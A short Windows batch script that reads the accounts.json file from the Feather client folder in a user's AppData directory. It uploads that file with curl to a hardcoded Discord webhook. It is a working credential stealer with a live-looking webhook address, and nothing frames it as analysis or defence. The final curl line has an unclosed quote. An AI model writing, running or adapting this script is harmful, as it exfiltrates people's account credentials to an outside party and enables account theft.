 Echo off

REM Path to the text file in AppData\Roaming\feather\accounts.json
set FILE_PATH=%USERPROFILE%\AppData\Roaming\feather\accounts.json

REM Discord webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1333133682915151943/U2EECivgXC_DLrYcEbb2eDlvs-PBS7HNvzd-RKy4IK0XQKLVsgTW58aCk99x-KMlBWy7
REM Ensure the file exists
if not exist "%FILE_PATH%" (
    echo File not found: %FILE_PATH%
    exit /b 1
)

REM Use curl to send the file
curl -X POST %WEBHOOK_URL% ^
    -H "Content-Type: multipart/form-data" ^
    -F "payload_json={"content":"Here is your file!"}" ^
    -F "file=@%FILE_PATH%
